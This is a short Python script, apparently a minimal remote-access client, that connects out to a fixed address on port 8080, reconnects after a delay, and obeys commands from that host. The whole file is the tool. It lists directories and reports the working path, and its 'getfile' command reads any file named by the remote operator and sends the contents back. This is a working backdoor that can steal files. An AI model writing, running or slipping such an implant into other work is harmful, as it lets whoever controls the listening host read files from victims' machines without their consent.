import os
import socket
from time import sleep

HOST = '192.168.0.10'
PORT = 8080

s = socket.socket()

def main():
    try:
        s.connect((HOST, PORT))
        session()
    except:
        sleep(500)
        s.connect((HOST, PORT))
        session()

def session():
    while True:
        data = s.recv(128)
        cmd = str(data, encoding="utf-8", errors="ignore")

        if cmd == 'shutdown':
            s.close()
            exit(0)

        elif cmd[:7] == "getfile":
            f = open(cmd[8:], "r")
            file = str(f.read())
            send_data(file)
            f.close()

        elif cmd == "cd":
            pwd = os.getcwd()
            send_data(pwd)

        elif cmd == "ls":
            files = ", ".join([f for f in os.listdir(os.getcwd())])
            send_data(files)

def send_data(data):
    data = data.encode("utf-8")
    length = len(data)
    try:
        s.send(length.to_bytes(4, 'big'))
        s.send(data)
    except Exception as e:
        s.send(bytes("Error:\n" + str(e) + "\n", encoding="utf-8", errors="ignore"))

if __name__ == '__main__':
    main()
